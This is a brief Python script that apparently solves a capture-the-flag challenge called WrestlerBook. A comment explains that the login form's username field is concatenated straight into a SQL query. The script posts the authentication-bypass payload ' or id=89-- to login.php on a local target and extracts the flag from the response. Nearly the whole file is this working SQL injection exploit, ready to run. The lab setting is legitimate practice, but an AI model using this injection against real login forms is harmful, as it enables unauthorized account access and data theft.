#!/usr/bin/env python3
# WrestlerBook: SQL injection in login.php. The username field is concatenated
# straight into the query, so `' or id=89--` logs us in as the user whose row
# carries the flag, which stats.html renders as "Flag: sun{...}".
import os
import re
import requests

URL = os.environ.get("URL", "http://localhost:19301").rstrip("/")

r = requests.post(URL + "/login.php",
                  data={"username": "' or id=89--", "password": "lmao"})
m = re.search(r"Flag: (sun\{.+?\})", r.text)
print(m.group(1) if m else "RIP")
